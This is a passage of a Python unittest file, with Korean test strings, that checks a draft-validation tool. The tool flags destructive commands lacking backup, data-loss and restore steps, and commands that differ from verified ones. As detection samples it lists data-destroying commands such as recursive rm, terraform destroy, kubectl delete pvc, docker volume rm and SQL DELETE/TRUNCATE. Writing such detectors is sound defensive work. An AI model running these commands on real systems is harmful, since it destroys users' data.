초기화 후에 백업을 만듭니다.
"""
        errors = rewrite.unsafe_code_example_errors(wrong_order)
        self.assertTrue(any("명령 전에 긍정형 백업" in error for error in errors), errors)
        self.assertTrue(any("명령 후 긍정형 복원" in error for error in errors), errors)

        conjugated_negation = """먼저 백업을 만들지 않습니다. 데이터 손실이 발생합니다.

`sh tools/reset.sh`

복원해야 하는 것은 아닙니다.
"""
        errors = rewrite.unsafe_code_example_errors(conjugated_negation)
        self.assertTrue(any("긍정형 백업" in error for error in errors), errors)
        self.assertTrue(any("긍정형 복원" in error for error in errors), errors)

        for negative_workflow in (
            """First, never create a backup. Data loss is irreversible.

`sh tools/reset.sh`

After the command, never restore from a snapshot.
""",
            """먼저 백업을 만들면 안 됩니다. 데이터 손실이 발생합니다.

`sh tools/reset.sh`

실행 후 스냅샷에서 복원합니다.
""",
        ):
            with self.subTest(negative_workflow=negative_workflow):
                errors = rewrite.unsafe_code_example_errors(negative_workflow)
                self.assertTrue(any("긍정형 백업" in error for error in errors), errors)
                if "never restore" in negative_workflow:
                    self.assertTrue(any("긍정형 복원" in error for error in errors), errors)

        denied_loss = """먼저 백업을 만듭니다. 데이터 손실이 없습니다.

`sh tools/reset.sh`

실행 후 스냅샷에서 복원합니다.
"""
        errors = rewrite.unsafe_code_example_errors(denied_loss)
        self.assertTrue(any("데이터 손실" in error for error in errors), errors)

        english_denied_loss = """Create a backup first. There is no data loss.

`sh tools/reset.sh`

After the command, restore from the snapshot.
"""
        errors = rewrite.unsafe_code_example_errors(english_denied_loss)
        self.assertTrue(any("데이터 손실" in error for error in errors), errors)

        for denied_warning in (
            "Data loss will not occur.",
            "Data loss does not occur.",
            "Data loss is not expected.",
            "영구 삭제는 발생하지 않습니다.",
        ):
            with self.subTest(denied_warning=denied_warning):
                content = (
                    "Create a backup first. " + denied_warning
                    + "\n\n`sh tools/reset.sh`\n\n"
                    "After the command, restore from the snapshot."
                )
                errors = rewrite.unsafe_code_example_errors(content)
                self.assertTrue(
                    any("데이터 손실" in error for error in errors), errors
                )

    def test_research_destructive_sequence_requires_explicit_before_and_after(self):
        misleading_order = {
            "facts": [
                {"statement": "복원합니다."},
                {"statement": "`sh tools/reset.sh`를 실행합니다."},
                {"statement": "데이터 손실이 발생합니다."},
                {"statement": "초기화 후에 먼저 백업을 만듭니다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_destructive_workflow_errors(misleading_order)
        self.assertTrue(any("명령 전의 긍정형 백업" in error for error in errors), errors)
        self.assertTrue(any("뒤 긍정형 복원" in error for error in errors), errors)

    def test_destructive_command_variants_and_inline_code_are_detected(self):
        commands = [
            "`sh tools/reset.sh`",
            "`rm --recursive --force ./data`",
            "`rm --verbose --recursive --force ./data`",
            "`docker-compose down -v`",
            "```bash\ndocker --context prod compose down \\\n+  --volumes\n```",
            "`docker volume rm app_data`",
            "`kubectl -n prod delete pvc database`",
            "`terraform -chdir=infra destroy`",
            "```sql\nDELETE\nFROM sessions;\n```",
            "`TRUNCATE TABLE sessions`",
        ]
        for command in commands:
            with self.subTest(command=command):
                errors = rewrite.unsafe_code_example_errors(
                    f"터미널에서 {command}를 실행합니다."
                )
                self.assertTrue(any("긍정형 백업" in error for error in errors), errors)
                self.assertTrue(any("데이터 손실" in error for error in errors), errors)
                self.assertTrue(any("긍정형 복원" in error for error in errors), errors)

    def test_destructive_command_gate_ignores_non_commands(self):
        harmless = [
            "```bash\nreset\n```",
            "```bash\nnpm install reset.css\n```",
            "모델의 가중치를 reset하고 다시 학습합니다.",
            "사용자는 계정 설정에서 자신의 데이터를 삭제할 수 있습니다.",
            "`terraform plan -destroy`",
            "`terraform destroy -help`",
            "`kubectl delete pod demo --dry-run=client`",
            "`git clean -nfd`",
            "`EXPLAIN DELETE FROM sessions`",
            "```sql\nEXPLAIN\nDELETE FROM sessions;\n```",
        ]
        for content in harmless:
            with self.subTest(content=content):
                self.assertEqual(rewrite.unsafe_code_example_errors(content), [])
                self.assertEqual(
                    rewrite.research_destructive_workflow_errors({
                        "facts": [{"statement": content}], "limitations": [],
                    }),
                    [],
                )

    def test_preview_command_cannot_launder_real_destructive_command(self):
        mixed_lines = [
            "terraform plan -destroy && terraform destroy -auto-approve",
            "terraform plan -destroy & terraform destroy -auto-approve",
            "terraform plan -destroy | terraform destroy -auto-approve",
            "kubectl delete pod demo --dry-run=client && kubectl delete pvc data",
            "kubectl delete pod demo --dry-run=client & kubectl delete pvc data",
            "git clean -nfd && git clean -fd",
            "git clean -nfd & git clean -fd",
            "EXPLAIN DELETE FROM sessions; DELETE FROM sessions;",
            "terraform destroy -auto-approve # 먼저 terraform plan -destroy",
        ]
        for command in mixed_lines:
            with self.subTest(command=command):
                errors = rewrite.unsafe_code_example_errors(f"```bash\n{command}\n```")
                self.assertTrue(any("긍정형 백업" in error for error in errors), errors)
                self.assertTrue(any("데이터 손실" in error for error in errors), errors)
                self.assertTrue(any("긍정형 복원" in error for error in errors), errors)

    def test_draft_destructive_gate_includes_published_faq_answers(self):
        draft = {
            "title": "테스트 안전 절차를 확인하는 방법",
            "description": "테스트 안전 절차를 실행하기 전에 확인해야 할 조건과 주의사항을 정리한 설명입니다.",
            "summary": "테스트 절차의 조건을 먼저 확인합니다. 실행 전에 확인할 주의사항과 판단 기준을 함께 점검합니다.",
            "content": (
                "이 글은 조건과 주의사항을 먼저 확인하도록 안내합니다.\n\n"
                "## 확인할 조건\n\n" + ("조건을 확인합니다. " * 55)
                + "\n\n## 실행 시 주의\n\n" + ("주의사항을 점검합니다. " * 55)
            ),
            "tags": ["테스트", "안전", "절차", "주의", "확인"],
            "entities": ["테스트"],
            "faq": [{
                "question": "어떻게 초기화하나요?",
                "answer": "초기화하려면 `sh tools/reset.sh`를 실행하세요.",
            }],
        }
        errors = rewrite.validate_draft(draft, {"sources": []}, {})
        self.assertTrue(any("긍정형 백업" in error for error in errors), errors)
        self.assertTrue(any("데이터 손실" in error for error in errors), errors)
        self.assertTrue(any("긍정형 복원" in error for error in errors), errors)

    def test_safety_actions_allow_unrelated_negative_conditions(self):
        backup_texts = [
            "데이터를 잃지 않도록 먼저 백업을 만듭니다.",
            "문제가 없더라도 먼저 백업을 만듭니다.",
        ]
        for text in backup_texts:
            self.assertTrue(rewrite.positive_safety_matches(
                text,
                rewrite.DESTRUCTIVE_BACKUP_ACTION_SIGNAL,
                rewrite.DESTRUCTIVE_BACKUP_NEGATION_SIGNAL,
            ), text)

        recovery_texts = [
            "서비스가 시작되지 않으면 스냅샷에서 복원합니다.",
            "If the service does not start, restore the snapshot.",
        ]
        for text in recovery_texts:
            self.assertTrue(rewrite.positive_safety_matches(
                text,
                rewrite.DESTRUCTIVE_RECOVERY_ACTION_SIGNAL,
                rewrite.DESTRUCTIVE_RECOVERY_NEGATION_SIGNAL,
            ), text)

    def test_empty_code_fences_and_unearned_result_guarantees_are_removed_or_rejected(self):
        cleaned = rewrite.clean_draft({
            "title": "테스트 제목입니다",
            "description": "테스트 설명입니다",
            "summary": "테스트 요약입니다",
            "content": "앞 문장입니다.\n\n```cpp\n\n```\n\n```bash\necho ok\n```",
            "tags": [],
            "entities": [],
            "faq": [],
        })
        self.assertNotIn("```cpp", cleaned["content"])
        self.assertIn("echo ok", cleaned["content"])

        draft = {
            "title": "CycleGAN PyTorch 학습과 테스트 파이프라인 구축",
            "description": "학습 및 테스트 명령을 실행하는 방법을 설명합니다.",
            "summary": "이 절차를 확인하면 오류 없이 학습과 테스트를 마칠 수 있습니다.",
            "content": (
                "CycleGAN PyTorch 실행 시 주의할 조건을 먼저 확인해야 합니다.\n\n"
                "## 테스트 실행\n\n```bash\npython test.py\n```\n\n"
                "## 설정 시 주의\n\n" + ("조건을 확인합니다. " * 70)
            ),
            "tags": ["CycleGAN", "PyTorch", "학습", "테스트", "가이드"],
            "entities": ["CycleGAN", "PyTorch"],
            "faq": [],
        }
        errors = rewrite.validate_draft(
            draft,
            {"sources": [], "primary_keyword": "CycleGAN PyTorch"},
            {},
        )
        self.assertTrue(any("결과를 보장" in error for error in errors))
        self.assertTrue(any("두 실행 단계" in error for error in errors))
        draft["summary"] = "학습과 테스트 단계에서 확인할 옵션과 제약을 설명합니다."
        draft["content"] = draft["content"].replace(
            "python test.py",
            "python train.py --model cycle_gan\npython test.py --model cycle_gan",
        )
        errors = rewrite.validate_draft(
            draft,
            {"sources": [], "primary_keyword": "CycleGAN PyTorch"},
            {},
        )
        self.assertFalse(any("결과를 보장" in error for error in errors))
        self.assertFalse(any("두 실행 단계" in error for error in errors))
        self.assertEqual(
            rewrite.safe_plain_label("Guide â APIÂ"),
            "Guide — API",
        )

    def test_research_execution_promise_requires_both_direct_commands(self):
        research = {
            "reader_promise": "공식 코드로 모델 학습·테스트 CLI 및 실행 절차를 익힙니다.",
            "recommended_angle": "학습과 테스트 명령을 함께 확인합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "모델은 입력 도메인의 매핑을 학습한다."},
                {"statement": "테스트 명령은 `python test.py --model cycle_gan`이다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_intent_coverage_errors(research)
        self.assertTrue(any("각 단계의 직접 검증된 명령" in error for error in errors))

        for promise in (
            "maps 데이터셋 학습, 테스트 명령어 실행 절차를 익힙니다.",
            "maps 데이터셋을 학습하고 테스트하는 명령어를 익힙니다.",
        ):
            comma_or_conjugation = {
                **research,
                "reader_promise": promise,
                "recommended_angle": "",
            }
            errors = rewrite.research_intent_coverage_errors(comma_or_conjugation)
            self.assertTrue(any(
                "각 단계의 직접 검증된 명령" in error for error in errors
            ), msg=promise)

        research["facts"].append({
            "statement": "학습 명령은 `python train.py --model cycle_gan`이다."
        })
        errors = rewrite.research_intent_coverage_errors(research)
        self.assertFalse(any("각 단계의 직접 검증된 명령" in error for error in errors))

        framework_research = {
            "reader_promise": "PyTorch 및 TensorFlow 모델 학습·테스트 CLI를 실행합니다.",
            "recommended_angle": "",
            "popular_questions": [],
            "facts": [
                {"statement": "PyTorch 테스트 명령은 `python test.py`이다."},
                {"statement": "PyTorch 학습 명령은 `python train.py`이다."},
                {"statement": "TensorFlow는 이미지를 무작위로 자른다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_intent_coverage_errors(framework_research)
        self.assertTrue(any("TensorFlow 학습 실행" in error for error in errors))
        self.assertTrue(any("TensorFlow 테스트 실행" in error for error in errors))

    def test_runnable_command_classifier_rejects_names_and_fragments(self):
        rejected = (
            "sbatch",
            "sbatch --",
            "sbatch --wrap",
            "sbatch --wrap=",
            "train.py",
            "--gpu_ids -1",
            "#SBATCH",
            "echo python train.py --model cycle_gan",
            "sbatch --help",
            "python train.py --model cycle_gan ...",
            "python train.py --model",
            "python train.py --name=<NAME>",
            "python train.py --name=[NAME]",
            "python train.py --name=${RUN_NAME}",
            "python train.py --name=YOUR_NAME",
            "python train.py --model cycle_gan --name",
            "python test.py --dataroot ./maps --gpu_ids",
            "scancel --name=<NAME>",
            "sbatch job.sh --partition",
            "scancel 12345 --signal",
            "curl https://example.com --output",
            "pip install -r",
            "pip3 install -r",
            "sbatch job.sh -q",
            "scancel 12345 -q",
            "bash train.py",
            "scancel &",
            "scancel 2>/dev/null",
            "git clone",
            "git clone --",
            "git clone -q",
            "curl --fail",
            "wget --quiet",
            "kubectl get",
            "kubectl get --",
            "kubectl get -o yaml",
            "python train.py &",
        )
        for literal in rejected:
            with self.subTest(literal=literal):
                records = rewrite.research_command_records({
                    "facts": [{"statement": f"실행 조각은 `{literal}`이다."}],
                    "limitations": [],
                })
                self.assertFalse(
                    any(rewrite.complete_runnable_command(item) for item in records),
                    records,
                )

        accepted = (
            "sbatch job.sh",
            "squeue",
            "scancel 12345",
            "python train.py --dataroot ./datasets/maps --model cycle_gan",
            "python test.py --dataroot ./datasets/maps --model cycle_gan",
            "python -m visdom.server",
            "pip install -r requirements.txt",
        )
        for literal in accepted:
            with self.subTest(literal=literal):
                records = rewrite.research_command_records({
                    "facts": [{"statement": f"직접 명령은 `{literal}`이다."}],
                    "limitations": [],
                })
                self.assertTrue(
                    any(rewrite.complete_runnable_command(item) for item in records),
                    records,
                )

    def test_unknown_command_and_subcommand_cannot_be_laundered(self):
        unknown = {
            "reader_problem": "fooctl 배포 명령을 실행하지 못합니다.",
            "reader_promise": "fooctl CLI 실행 방법을 익힙니다.",
            "recommended_angle": "fooctl 명령 예제를 확인합니다.",
            "popular_questions": [],
            "facts": [{"statement": "현재 디렉터리는 `pwd`로 확인한다."}],
            "limitations": [],
        }
        self.assertTrue(rewrite.research_has_operational_cli_promise(unknown))
        errors = rewrite.research_runnable_procedure_errors(unknown)
        self.assertTrue(any("fooctl" in error for error in errors), errors)
        draft_errors = rewrite.draft_runnable_procedure_errors(
            {"content": "```bash\npwd\n```", "faq": []},
            unknown,
        )
        self.assertTrue(any("fooctl" in error for error in draft_errors), draft_errors)

        wrong_subcommand = {
            "reader_problem": "저장소를 내려받지 못합니다.",
            "reader_promise": "git clone 명령 실행 방법을 익힙니다.",
            "recommended_angle": "git clone 명령 예제를 확인합니다.",
            "popular_questions": [],
            "facts": [{"statement": "상태 조회 명령은 `git status`이다."}],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(wrong_subcommand)
        self.assertTrue(any("git clone" in error for error in errors), errors)

        arbitrary = {
            "reader_problem": "wrangler 배포를 시작하지 못합니다.",
            "reader_promise": "wrangler CLI 설치 및 실행 방법을 익힙니다.",
            "recommended_angle": "터미널 예제를 확인합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "도구 이름은 `wrangler`이다."},
                {"statement": "현재 디렉터리는 `pwd`로 확인한다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(arbitrary)
        self.assertTrue(any("wrangler" in error for error in errors), errors)

    def test_operational_promise_without_cli_noun_still_triggers(self):
        for promise in (
            "sbatch로 제출하고 squeue로 조회합니다.",
            "train.py로 학습하고 test.py로 테스트합니다.",
            "gh로 pull request를 조회합니다.",
            "wrangler로 서비스를 배포합니다.",
            "kubectl로 Pod를 삭제합니다.",
            "terraform으로 인프라를 생성합니다.",
            "npm으로 패키지를 업데이트합니다.",
            "curl로 파일을 다운로드합니다.",
            "gh로 PR을 생성합니다.",
        ):
            with self.subTest(promise=promise):
                research = {
                    "reader_problem": promise,
                    "reader_promise": promise,
                    "recommended_angle": "",
                    "popular_questions": [],
                    "facts": [],
                    "limitations": [],
                }
                self.assertTrue(
                    rewrite.research_has_operational_cli_promise(research),
                    promise,
                )
                self.assertTrue(
                    rewrite.research_runnable_procedure_errors(research),
                    promise,
                )

    def test_negative_or_wrong_command_claim_is_not_positive_evidence(self):
        research = {
            "reader_problem": "Slurm 작업을 제출하지 못합니다.",
            "reader_promise": "sbatch CLI 실행 방법을 익힙니다.",
            "recommended_angle": "sbatch 제출 명령을 확인합니다.",
            "popular_questions": [],
            "facts": [],
            "limitations": [{
                "statement": "잘못된 `sbatch broken.sh` 명령은 실행하면 안 됩니다."
            }],
        }
        errors = rewrite.research_runnable_procedure_errors(research)
        self.assertTrue(any("sbatch" in error for error in errors), errors)

        research["facts"] = [{"statement": "제출 명령은 `sbatch good.sh`이다."}]
        draft = {
            "content": (
                "잘못된 명령이므로 실행하면 안 됩니다.\n\n"
                "```bash\nsbatch good.sh\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(draft, research)
        self.assertTrue(any("fenced shell" in error for error in errors), errors)

        for failure_context in (
            "이 명령은 실패합니다.",
            "실패하는 명령입니다.",
            "이 명령은 오류가 납니다.",
            "에러가 납니다.",
            "성공하지 못합니다.",
            "실행할 수 없습니다.",
            "잘못되었습니다.",
            "비권장입니다.",
        ):
            with self.subTest(failure_context=failure_context):
                errors = rewrite.draft_runnable_procedure_errors(
                    {
                        "content": f"{failure_context}\n\n```bash\nsbatch good.sh\n```",
                        "faq": [],
                    },
                    research,
                )
                self.assertTrue(any("fenced shell" in error for error in errors), errors)

        for commented_command in (
            "# 이 명령은 실패합니다.\nsbatch good.sh",
            "# 잘못된 명령이므로 실행하면 안 됩니다.\nsbatch good.sh",
            "sbatch good.sh # 실행하면 안 됩니다",
            "sbatch good.sh\n# 사용하지 마세요",
        ):
            with self.subTest(negative_shell_comment=commented_command):
                errors = rewrite.draft_runnable_procedure_errors(
                    {
                        "content": f"```bash\n{commented_command}\n```",
                        "faq": [],
                    },
                    research,
                )
                self.assertTrue(any("fenced shell" in error for error in errors), errors)

        for troubleshooting_heading in (
            "실행 실패 시 확인",
            "실행 오류 진단",
        ):
            with self.subTest(valid_troubleshooting_heading=troubleshooting_heading):
                self.assertEqual(
                    rewrite.draft_runnable_procedure_errors(
                        {
                            "content": (
                                f"## {troubleshooting_heading}\n\n"
                                "아래 검증된 명령을 실행합니다.\n\n"
                                "```bash\nsbatch good.sh\n```"
                            ),
                            "faq": [],
                        },
                        research,
                    ),
                    [],
                )

        errors = rewrite.draft_runnable_procedure_errors(
            {
                "content": (
                    "## 잘못된 명령 예시\n\n"
                    "```bash\nsbatch good.sh\n```"
                ),
                "faq": [],
            },
            research,
        )
        self.assertTrue(any("fenced shell" in error for error in errors), errors)

        for recovery_context in (
            "실행에 실패하면 다음 명령으로 상태를 확인합니다.",
            "작업 실행 오류가 발생하면 아래 명령을 사용합니다.",
            "앞 단계가 실패하면 다음 명령을 실행합니다.",
        ):
            with self.subTest(valid_recovery_context=recovery_context):
                self.assertEqual(
                    rewrite.draft_runnable_procedure_errors(
                        {
                            "content": (
                                f"{recovery_context}\n\n"
                                "```bash\nsbatch good.sh\n```"
                            ),
                            "faq": [],
                        },
                        research,
                    ),
                    [],
                )

        for statement in (
            "`sbatch broken.sh` 명령은 실행에 실패합니다.",
            "`sbatch broken.sh` 명령은 사용할 수 없습니다.",
            "`sbatch broken.sh` 명령은 동작하지 않습니다.",
            "`sbatch broken.sh` 명령은 사용은 불가능합니다.",
            "`sbatch broken.sh` 명령은 성공하지 않습니다.",
            "`sbatch broken.sh` 명령은 권장하지 않습니다.",
            "`sbatch broken.sh` 명령은 deprecated 상태입니다.",
            "`sbatch broken.sh` 명령은 쓰지 마세요.",
            "The command `sbatch broken.sh` does not work.",
        ):
            with self.subTest(statement=statement):
                negative = {
                    **research,
                    "facts": [{"statement": statement}],
                    "limitations": [],
                }
                errors = rewrite.research_runnable_procedure_errors(negative)
                self.assertTrue(any("sbatch" in error for error in errors), errors)

    def test_draft_command_must_match_verified_argv_exactly(self):
        research = {
            "reader_problem": "Slurm 작업을 제출하지 못합니다.",
            "reader_promise": "sbatch CLI 실행 방법을 익힙니다.",
            "recommended_angle": "sbatch 제출 명령을 확인합니다.",
            "popular_questions": [],
            "facts": [{"statement": "제출 명령은 `sbatch good.sh`이다."}],
            "limitations": [],
        }
        wrong = {"content": "```bash\nsbatch wrong.sh\n```", "faq": []}
        errors = rewrite.draft_runnable_procedure_errors(wrong, research)
        self.assertTrue(any("argv" in error for error in errors), errors)
        self.assertTrue(any("sbatch" in error for error in errors), errors)

        exact = {"content": "```bash\nsbatch good.sh\n```", "faq": []}
        self.assertEqual(rewrite.draft_runnable_procedure_errors(exact, research), [])

        mixed = {
            "content": (
                "```bash\nsbatch good.sh\nsbatch hallucinated.sh\npwd\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(mixed, research)
        self.assertTrue(any("일치하지 않는 명령" in error for error in errors), errors)

        for wrapped in (
            "sudo sbatch good.sh",
            "CUDA_VISIBLE_DEVICES=-1 sbatch good.sh",
            "env -i sbatch good.sh",
            "nohup sbatch good.sh",
        ):
            with self.subTest(wrapped=wrapped):
                errors = rewrite.draft_runnable_procedure_errors(
                    {"content": f"```bash\n{wrapped}\n```", "faq": []},
                    research,
                )
                self.assertTrue(any("argv" in error for error in errors), errors)

        for fragment in (
            "sbatch",
            "python train.py --model",
            "echo sbatch wrong.sh",
            "not-a-real-command",
            'sbatch "broken',
            "sbatch 'broken",
            '"unterminated',
        ):
            with self.subTest(fragment=fragment):
                errors = rewrite.draft_runnable_procedure_errors(
                    {
                        "content": f"```bash\nsbatch good.sh\n{fragment}\n```",
                        "faq": [],
                    },
                    research,
                )
                self.assertTrue(any("명령 조각" in error for error in errors), errors)

        bare_directive = {
            "content": "```bash\nsbatch good.sh\n#SBATCH\n```",
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(bare_directive, research)
        self.assertTrue(any("불완전한 #SBATCH" in error for error in errors), errors)

        for language in ("text", "python", "json"):
            with self.subTest(language=language):
                hidden = {
                    "content": (
                        "```bash\nsbatch good.sh\n```\n\n"
                        f"```{language}\nsbatch wrong.sh\n```"
                    ),
                    "faq": [],
                }
                errors = rewrite.draft_runnable_procedure_errors(hidden, research)
                self.assertTrue(any("숨겨져" in error for error in errors), errors)

        for python_body in (
            'os.system("sbatch wrong.sh")',
            'subprocess.run(["sbatch", "wrong.sh"])',
            'cmd = "sbatch wrong.sh"',
        ):
            with self.subTest(python_body=python_body):
                hidden = {
                    "content": (
                        "```bash\nsbatch good.sh\n```\n\n"
                        f"```python\n{python_body}\n```"
                    ),
                    "faq": [],
                }
                errors = rewrite.draft_runnable_procedure_errors(hidden, research)
                self.assertTrue(any("명령 이름이" in error for error in errors), errors)

        wrangler = {
            "reader_problem": "wrangler로 서비스를 배포합니다.",
            "reader_promise": "wrangler CLI 배포 방법을 익힙니다.",
            "recommended_angle": "wrangler 배포 명령을 확인합니다.",
            "popular_questions": [],
            "facts": [{"statement": "배포 명령은 `wrangler deploy prod`이다."}],
            "limitations": [],
        }
        hidden_unknown = {
            "content": (
                "```bash\nwrangler deploy prod\n```\n\n"
                "```\nwrangler deploy staging\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(hidden_unknown, wrangler)
        self.assertTrue(any("숨겨져" in error for error in errors), errors)

    def test_stepwise_command_contract_requires_an_ordered_subsequence(self):
        research = {
            "reader_problem": "Slurm 작업 관리 순서를 알지 못합니다.",
            "reader_promise": (
                "sbatch 제출부터 squeue 조회, scancel 취소까지 단계별 CLI 흐름을 익힙니다."
            ),
            "recommended_angle": "제출부터 취소까지 순서대로 실행합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "제출 명령은 `sbatch job.sh`이다."},
                {"statement": "조회 명령은 `squeue -j 12345`이다."},
                {"statement": "취소 명령은 `scancel 12345`이다."},
            ],
            "limitations": [],
        }
        reverse = {
            "content": (
                "```bash\nscancel 12345\nsqueue -j 12345\nsbatch job.sh\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(reverse, research)
        self.assertTrue(any("실행 순서" in error for error in errors), errors)

        ordered = {
            "content": (
                "```bash\nsbatch job.sh\nsqueue -j 12345\nscancel 12345\n```"
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.draft_runnable_procedure_errors(ordered, research), [])

    def test_inline_sequence_uses_exact_argv_without_identity_alias_steps(self):
        phase_one = "python train.py --phase 1"
        phase_two = "python train.py --phase 2"
        research = {
            "reader_problem": "두 학습 단계를 순서대로 실행합니다.",
            "reader_promise": (
                f"`{phase_one}` 뒤 `{phase_two}`를 순서대로 실행합니다."
            ),
            "recommended_angle": "두 단계를 순서대로 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": f"첫 명령은 `{phase_one}`이다."},
                {"statement": f"둘째 명령은 `{phase_two}`이다."},
            ],
            "limitations": [],
        }
        reverse = {
            "content": f"```bash\n{phase_two}\n{phase_one}\n```",
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(reverse, research)
        self.assertTrue(any("정확 argv 순서" in error for error in errors), errors)
        forward = {
            "content": f"```bash\n{phase_one}\n{phase_two}\n```",
            "faq": [],
        }
        self.assertEqual(rewrite.draft_runnable_procedure_errors(forward, research), [])
        for body in (
            f"{phase_two}\n{phase_one}\n{phase_two}",
            f"{phase_one}\n{phase_one}\n{phase_two}",
            f"{phase_one}\n{phase_two}\n{phase_two}",
        ):
            with self.subTest(extra_or_reordered_body=body):
                errors = rewrite.draft_runnable_procedure_errors(
                    {"content": f"```bash\n{body}\n```", "faq": []},
                    research,
                )
                self.assertTrue(any("정확 argv 순서·횟수" in error for error in errors), errors)

        faq_duplicate = {
            "content": f"```bash\n{phase_one}\n{phase_two}\n```",
            "faq": [{
                "question": "첫 단계를 다시 실행해도 되나요?",
                "answer": f"```bash\n{phase_one}\n```",
            }],
        }
        errors = rewrite.draft_runnable_procedure_errors(faq_duplicate, research)
        self.assertTrue(any("정확 argv 순서·횟수" in error for error in errors), errors)

        faq_unmatched = {
            "content": f"```bash\n{phase_one}\n{phase_two}\n```",
            "faq": [{
                "question": "초기화 명령도 필요한가요?",
                "answer": "```bash\npython wipe.py --mode prod\n```",
            }],
        }
        errors = rewrite.draft_runnable_procedure_errors(faq_unmatched, research)
        self.assertTrue(
            any("긍정형 검증 F/L과 일치하지 않는 명령" in error for error in errors),
            errors,
        )

        unrelated_text_command = {
            "content": f"```bash\n{phase_one}\n{phase_two}\n```",
            "faq": [{
                "question": "다른 배포 명령도 있나요?",
                "answer": "```text\nwrangler deploy prod\n```",
            }],
        }
        errors = rewrite.draft_runnable_procedure_errors(
            unrelated_text_command,
            research,
        )
        self.assertTrue(any("non-shell fence" in error for error in errors), errors)

        negated_unmatched = {
            "content": (
                f"```bash\n{phase_one}\n{phase_two}\n```\n\n"
                "잘못된 명령이므로 실행하면 안 됩니다.\n\n"
                "```bash\npython hallucinate.py --prod\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(negated_unmatched, research)
        self.assertTrue(
            any(
                "일치하지 않는 명령" in error or "불완전하거나 비실행" in error
                for error in errors
            ),
            errors,
        )

        negated_duplicate = {
            "content": (
                f"```bash\n{phase_one}\n{phase_two}\n```\n\n"
                "이 명령은 사용하지 않습니다.\n\n"
                f"```bash\n{phase_one}\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(negated_duplicate, research)
        self.assertTrue(any("정확 argv 순서·횟수" in error for error in errors), errors)

        prose_warning_only = {
            "content": (
                f"```bash\n{phase_one}\n{phase_two}\n```\n\n"
                "근거에 없는 추가 명령은 실행하지 않습니다."
            ),
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(prose_warning_only, research),
            [],
        )

        for shell_control in ("|", "&", ";", "&&", "||"):
            with self.subTest(unquoted_shell_control=shell_control):
                controlled = {
                    "content": (
                        f"```bash\n{phase_one} {shell_control} {phase_two}\n```"
                    ),
                    "faq": [],
                }
                errors = rewrite.draft_runnable_procedure_errors(
                    controlled,
                    research,
                )
                self.assertTrue(any("제어 연산자" in error for error in errors), errors)

        self.assertFalse(
            rewrite.unquoted_shell_control_operators(
                "python train.py '--label=a|b;&' \"x&&y\" # | & ; && ||"
            )
        )
        comment_controls = {
            "content": (
                f"```bash\n{phase_one} # | & ; && ||\n{phase_two}\n```"
            ),
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(comment_controls, research),
            [],
        )

        for prompt_marker in ("$", "PS>"):
            with self.subTest(published_shell_prompt_marker=prompt_marker):
                prompted = {
                    "content": (
                        f"```bash\n{prompt_marker} {phase_one}\n{phase_two}\n```"
                    ),
                    "faq": [],
                }
                errors = rewrite.draft_runnable_procedure_errors(prompted, research)
                self.assertTrue(any("prompt marker" in error for error in errors), errors)

        for hidden_code in (
            f"    {phase_one}",
            "> ```bash\n> python wipe.py --mode prod\n> ```",
        ):
            hidden = {
                "content": f"```bash\n{phase_one}\n{phase_two}\n```",
                "faq": [{"question": "추가 명령인가요?", "answer": hidden_code}],
            }
            with self.subTest(hidden_markdown_code=hidden_code):
                errors = rewrite.draft_runnable_procedure_errors(hidden, research)
                self.assertTrue(
                    any("최상위 fenced block만 허용" in error for error in errors),
                    errors,
                )

        first_next = {
            **research,
            "reader_promise": (
                f"먼저 `{phase_one}`, 다음 `{phase_two}`를 실행합니다."
            ),
        }
        errors = rewrite.draft_runnable_procedure_errors(reverse, first_next)
        self.assertTrue(any("정확 argv 순서" in error for error in errors), errors)
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(forward, first_next),
            [],
        )

        phase_three = "python test.py --phase 3"
        multiple_sequences = {
            **research,
            "reader_promise": (
                f"먼저 `{phase_one}`, 다음 `{phase_two}`를 실행합니다."
            ),
            "popular_questions": [
                f"먼저 `{phase_three}`, 다음 `{phase_one}`을 실행하나요?"
            ],
            "facts": [
                *research["facts"],
                {"statement": f"검증 명령은 `{phase_three}`이다."},
            ],
        }
        contract = json.loads(rewrite.prompt_execution_contract(multiple_sequences))
        self.assertEqual(
            contract["required_inline_ordered_sequences_exact_argv"],
            [[phase_one, phase_two], [phase_three, phase_one]],
        )
        valid_combined = {
            "content": f"```bash\n{phase_three}\n{phase_one}\n{phase_two}\n```",
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(valid_combined, multiple_sequences),
            [],
        )
        invalid_combined = {
            "content": f"```bash\n{phase_one}\n{phase_two}\n{phase_three}\n```",
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(
            invalid_combined,
            multiple_sequences,
        )
        self.assertTrue(any("정확 argv 순서·횟수" in error for error in errors), errors)

        conflicting_order = {
            **research,
            "reader_promise": (
                f"먼저 `{phase_one}`, 다음 `{phase_two}`를 실행합니다."
            ),
            "popular_questions": [
                f"먼저 `{phase_two}`, 다음 `{phase_one}`을 실행하나요?"
            ],
        }
        errors = rewrite.research_runnable_procedure_errors(conflicting_order)
        self.assertTrue(any("서로 반대이거나 순환" in error for error in errors), errors)

        conflicting_count = {
            **multiple_sequences,
            "reader_problem": (
                f"먼저 `{phase_one}`, 다음 `{phase_two}`, 마지막으로 "
